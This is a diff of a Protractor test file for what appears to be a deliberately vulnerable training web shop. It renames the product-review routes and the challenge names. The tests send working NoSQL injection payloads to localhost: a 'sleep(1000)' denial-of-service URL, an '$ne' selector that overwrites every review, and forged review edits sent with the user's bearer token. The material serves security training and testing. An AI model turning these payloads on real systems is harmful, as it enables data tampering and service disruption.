@@ -1,6 +1,6 @@
 const config = require('config')
 
-describe('/rest/product/reviews', () => {
+describe('/rest/products/reviews', () => {
   beforeEach(() => {
     browser.get('/#/search')
   })
@@ -17,24 +17,24 @@ describe('/rest/product/reviews', () => {
             console.log('Success')
           }
         }
-        xhttp.open('GET', 'http://localhost:3000/rest/product/sleep(1000)/reviews', true)
+        xhttp.open('GET', 'http://localhost:3000/rest/products/sleep(1000)/reviews', true)
         xhttp.setRequestHeader('Content-type', 'text/plain')
         xhttp.send()
       })
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL DoS' })
   })
 
   describe('challenge "NoSql Reviews Injection"', () => {
     it('should be possible to inject a selector into the update route', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","http://localhost:3000/rest/product/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));') // eslint-disable-line
+      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","http://localhost:3000/rest/products/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));') // eslint-disable-line
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL Manipulation' })
   })
 
   describe('challenge "NoSql Orders Injection"', () => {
@@ -54,7 +54,7 @@ describe('/rest/product/reviews', () => {
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL Exfiltration' })
   })
 
   describe('challenge "Forged Review"', () => {
@@ -71,7 +71,7 @@ describe('/rest/product/reviews', () => {
           }
         }
 
-        xhttp.open('GET', 'http://localhost:3000/rest/product/1/reviews', true)
+        xhttp.open('GET', 'http://localhost:3000/rest/products/1/reviews', true)
         xhttp.setRequestHeader('Content-type', 'text/plain')
         xhttp.send()
 
@@ -82,10 +82,10 @@ describe('/rest/product/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('PATCH', 'http://localhost:3000/rest/product/reviews', true)
+          xhttp.open('PATCH', 'http://localhost:3000/rest/products/reviews', true)
           xhttp.setRequestHeader('Content-type', 'application/json')
           xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
-          xhttp.send(JSON.stringify({ 'id': reviewId, 'message': 'injected' }))
+          xhttp.send(JSON.stringify({ id: reviewId, message: 'injected' }))
         }
       })
       browser.driver.sleep(5000)
@@ -110,7 +110,7 @@ describe('/rest/product/reviews', () => {
           }
         }
 
-        xhttp.open('GET', 'http://localhost:3000/rest/product/1/reviews', true)
+        xhttp.open('GET', 'http://localhost:3000/rest/products/1/reviews', true)
         xhttp.setRequestHeader('Content-type', 'text/plain')
         xhttp.send()
 
@@ -121,10 +121,10 @@ describe('/rest/product/reviews', () => {
               console.log('Success')
             }
           }
-          xhttp.open('POST', 'http://localhost:3000/rest/product/reviews', true)
+          xhttp.open('POST', 'http://localhost:3000/rest/products/reviews', true)
           xhttp.setRequestHeader('Content-type', 'application/json')
           xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
-          xhttp.send(JSON.stringify({ 'id': reviewId }))
+          xhttp.send(JSON.stringify({ id: reviewId }))
         }
       })
       browser.driver.sleep(5000)
